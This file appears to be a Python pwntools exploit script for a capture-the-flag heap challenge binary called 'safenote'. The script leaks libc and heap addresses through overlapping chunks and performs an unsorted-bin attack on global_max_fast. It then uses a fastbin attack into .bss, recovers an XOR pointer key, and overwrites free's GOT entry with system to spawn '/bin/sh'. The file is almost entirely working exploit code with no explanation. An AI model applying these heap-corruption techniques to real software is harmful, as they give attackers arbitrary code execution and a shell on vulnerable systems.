from pwn import *

#context.log_level= 'debug'
#context.aslr = False

io = process('./safenote')
e = ELF('./safenote')
libc = e.libc

def add(size, buf):
	io.recvuntil('Exit\n')
	io.sendline('1')
	io.recvuntil(':\n')
	io.sendline(str(size))
	io.recvuntil('cmd:\n')
	io.sendline(buf)

def delete(id):
	io.recvuntil('Exit\n')
	io.sendline('2')
	io.recvuntil('id:')
	io.sendline(str(id))

def listall():
	io.recvuntil('Exit\n')
	io.sendline('4')
	io.recvuntil('+++++++++++++++++++++++')
	#buf = io.recvuntil('+++++++++++++++++++++++')
	#return buf.strip('+')

def edit(id, buf):
	io.recvuntil('Exit\n')
	io.sendline('5')
	io.recvuntil('d on list)\n')
	io.sendline(str(id))
	io.recvuntil(':\n')
	io.sendline(buf)


add(0x400 - 0x100, 'A'*0x20) # *0* alloc 0x300 as round 0x100!
add(0x100 - 0x100, 'B'*0x20) # *1*

delete(0)
add(0x100 - 0x100, 'C'*0x20) # *0* alloc 0x100
add(0x100 - 0x100, 'D'*0x20) # *2*
add(0x100 - 0x100, 'E'*0x20) # *3* 

delete(0)
delete(1)  # merge

add(0x500 - 0x100, 'A'*0x20) # *0* overlap *2*
add(0x100 - 0x100, 'A'*0x20) # *1* avoid consolidate top chunk 
add(0x100 - 0x100, 'A'*0x20) # 
add(0x100 - 0x100, 'A'*0x20) # *5* used to leak key 


edit(0, 'A'*(0x100 - 0x18)) # leak unsortbin_addr 
listall()
io.recvuntil('A'*(0x100 - 0x18))
buf = io.recvuntil('\nid')[:-3]

#assert len(buf)==6
buf = buf.ljust(8,'\x00')
main_arena = u64(buf) - 88
log.success('main_arena:%#x'% main_arena)

libc_base = main_arena - 0x03a3620
global_max_fast = libc_base + 0x003a5860
libc.address = libc_base

payload = 'A'*(0x100 - 0x18 - 0x8)
payload += p64(0x101)
payload += p64(main_arena+88) + p64(main_arena+88)
edit(0, payload)

delete(2) # free *2*
payload = 'A'*(0x100 - 0x18 - 0x8)
payload += p64(0x101)
payload += p64(main_arena+88) + p64(global_max_fast - 0x10)
edit(0, payload)

add(0x100 - 0x100, 'D'*0x20) # *2* unsorted attack
# now global_max_fast = unsorted_bin
delete(3)
delete(2) # 2->fd = 3

edit(0, 'A'*(0x100 - 0x18 + 1 )) # heap_addr lastbyte is 0x00
listall()
io.recvuntil('A'*(0x100 - 0x18 + 1))
buf = io.recvuntil('\nid')[:-3]  # leak heap_addr 
buf = ('\x00'+buf).ljust(8,'\x00')
heap_addr = u64(buf) - 0x200

log.success('heap:%#x'% heap_addr)


payload = 'A'*(0x100 - 0x18 - 0x8)
payload += p64(0x101)
payload += p64(0x602120) 
edit(0, payload) # overlap fd, fastbin attack

add(0x100 - 0x100, 'A'*0x10) # *2*
add(0x100 - 0x100, '') # *3* we get bss here.

edit(3, 'X'*8)
listall()
io.recvuntil('X'*8)
buf = io.recv(8) # leak *5* ptr
xor_ptr = u64(buf)
key = xor_ptr ^ (heap_addr + 0x610) 
log.success("key:%#x"% key)


#gdb.attach(io, 'b *0x4013C7\n b*0x4010AA ')# \nb* 0x00400BE9 ')
edit(3, 'A'*8 + p64((e.got['free'] - 24)^ key))
#listall()
#io.recvuntil('id 5 : ')
#buf = io.recv(6)
#buf = buf.ljust(8,'\x00')
#log.success('free:%#x'%u64(buf))

edit(5, p64(libc.symbols['system']))
edit(0, 'A'*(0x100 -0x18) + '/bin/sh\x00')
delete(2)

io.interactive()


